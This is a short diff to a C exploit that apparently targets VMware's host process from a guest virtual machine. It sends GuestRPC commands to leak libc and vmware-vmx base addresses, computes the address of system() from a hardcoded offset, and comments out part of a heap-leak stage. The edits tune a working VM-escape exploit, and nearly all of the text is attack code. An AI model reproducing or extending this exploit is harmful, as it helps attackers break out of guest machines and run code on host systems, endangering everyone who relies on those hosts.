@@ -185,6 +185,7 @@ int main() {
 	strcpy(data, "vmx.capability.dnd_version");
 	guestrpc_command_len(cp, strlen(data));
 	guestrpc_command_send(cp, data);
+    guestrpc_close(cp);
 
 	// leak out the libc pointer 
 	memset(data, 0xCC, sizeof(data));
@@ -202,10 +203,11 @@ int main() {
 		printf("vmware-vmx base seems wrong, bailing\n");
 		exit(0);
 	}
-
-	uint64_t system = vmxbase + 0xecfd6;
+	uint64_t system = vmxbase + 0xecfd0;
 	
 	// -----------------------------------------------------
+    
+    /*
 
 	first = guestrpc_open();
 
@@ -271,6 +273,8 @@ int main() {
 		printf("arena val seems wrong, bailing\n");
 		exit(0);
 	}
+
+    */
 
 	// same as above, but now let's leak a heap chunk
 	//
